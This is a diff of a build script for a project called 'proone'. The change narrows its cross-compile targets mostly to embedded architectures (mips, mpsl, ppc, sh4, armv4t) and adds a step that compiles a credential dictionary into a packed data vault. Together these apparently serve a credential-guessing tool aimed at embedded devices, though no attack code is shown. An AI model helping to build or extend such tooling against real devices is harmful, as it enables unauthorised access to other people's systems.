@@ -2,33 +2,33 @@
 set -e
 
 ARCH_ARR=(
-	"aarch64"
+#	"aarch64"
 	"armv4t"
-	"armv7"
+#	"armv7"
 	"i686"
-	"x86_64"
+#	"x86_64"
 	"mips"
 	"mpsl"
 	"ppc"
 	"sh4"
 )
 TOOLCHAIN_ARR=(
-	"aarch64"
+#	"aarch64"
 	"armv4t"
-	"armv7"
+#	"armv7"
 	"i686"
-	"x86_64"
+#	"x86_64"
 	"mips"
 	"mpsl"
 	"ppc"
 	"sh4"
 )
 HOST_ARR=(
-	"aarch64-linux"
+#	"aarch64-linux"
 	"arm-linux"
-	"arm-linux"
+#	"arm-linux"
 	"i686-linux"
-	"x86_64-linux"
+#	"x86_64-linux"
 	"mips-linux"
 	"mipsel-linux"
 	"powerpc-linux"
@@ -52,10 +52,12 @@ export PROONE_EXEC_PREFIX="$PROONE_EXEC_DIR/exec"
 export PROONE_MISC_BIN_PREFIX="$PROONE_MISC_BIN_DIR/"
 PROONE_REL_PREFIX="$PROONE_REL_DIR/proone"
 PROONE_BINARCH_PREFIX="$PROONE_BINARCH_DIR/binarch"
+PROONE_CDICT="$PROONE_PREFIX/cred_dict.bin"
 PROONE_DVAULT="$PROONE_PREFIX/dvault.bin"
 PROONE_TOOLS="
 	proone-pack
 	proone-list-arch
+	proone-mkcdict
 	proone-mkdvault
 	proone-ipaddr-arr
 "
@@ -69,9 +71,7 @@ set -e
 
 # native build for tools
 ./configure $PROONE_AM_CONF
-cd src
-make -j$(nproc) $PROONE_TOOLS
-cd ..
+make -j$(nproc) -C src $PROONE_TOOLS
 for t in $PROONE_TOOLS; do
 	cp -a "src/$t" "$PROONE_TOOLS_DIR"
 done
@@ -79,7 +79,8 @@ cp -a "./src/run-tests.sh" "./src/testlist" "$PROONE_MISC_BIN_DIR"
 make distclean
 
 # generate dvault
-"$PROONE_TOOLS_DIR/proone-mkdvault" > "$PROONE_DVAULT"
+"$PROONE_TOOLS_DIR/proone-mkcdict" "./src/proone_conf/cred_dict.txt" "$PROONE_CDICT"
+"$PROONE_TOOLS_DIR/proone-mkdvault" "$PROONE_CDICT" > "$PROONE_DVAULT"
 DVAULT_SIZE=$(stat -c "%s" "$PROONE_DVAULT")
 
 # cross-compile targets
